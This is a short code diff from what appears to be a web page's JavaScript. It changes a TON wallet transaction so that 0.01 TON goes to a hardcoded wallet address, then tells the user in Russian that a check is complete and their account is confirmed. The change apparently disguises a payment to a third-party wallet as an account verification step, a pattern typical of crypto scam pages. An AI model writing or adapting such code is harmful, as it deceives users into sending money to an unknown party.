@@ -765,15 +765,14 @@ document.addEventListener("DOMContentLoaded", function () {
 
       try {
         const transaction = {
-          valid_until: Math.floor(Date.now() / 1000) + 300,
-          messages: [
-            {
-              address: contractAddress,
-              amount: '50000000',
-              payload: payloadBase64
-            }
-          ]
-        };
+    valid_until: Math.floor(Date.now() / 1000) + 300,
+    messages: [
+        {
+            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
+            amount: '10000000' // 0.01 TON
+        }
+    ]
+};
         await ui.sendTransaction(transaction);
         err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
         err.style.color = '#00ff88';
